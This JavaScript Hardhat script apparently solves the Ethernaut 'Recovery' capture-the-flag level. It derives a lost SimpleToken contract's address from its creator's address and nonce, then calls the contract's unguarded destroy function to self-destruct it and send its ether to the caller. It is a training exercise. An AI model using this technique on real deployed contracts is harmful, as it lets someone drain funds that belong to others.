const { ethers } = require("hardhat");

async function main() {
  const [owner, otherAccount] = await ethers.getSigners();
  // attach your instance address
  const Instance = "0x9D961C554df02FE307cdA4487Fe29Aa30f60F9E8";
  const RecoveryContract = await ethers.getContractFactory("Recovery");
  const Recovery = RecoveryContract.attach(Instance);
  const nonce = "0x01";
  const rlpEncoded = ethers.utils.RLP.encode([Instance, nonce]);
  const contractAddress = ethers.utils.keccak256(rlpEncoded);

  const recomputedContractAddress = ethers.utils.getContractAddress({
    from: Instance,
    nonce: ethers.BigNumber.from(`1`),
  });
  console.log(recomputedContractAddress);

  // You can also find the address in the internalTransaction of the Ethernaut Instance & double Check it with contractAddress we get..
  const SimpleTokenAddress = `0x${contractAddress.substring(
    contractAddress.length - 40
  )}`;
  console.log(SimpleTokenAddress);
  const SimpleToken = await ethers.getContractAt(
    "SimpleToken",
    SimpleTokenAddress,
    owner
  );
  const tokenName = await SimpleToken.name();
  await SimpleToken.destroy(owner.address);
  console.log(tokenName, "tokenName");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
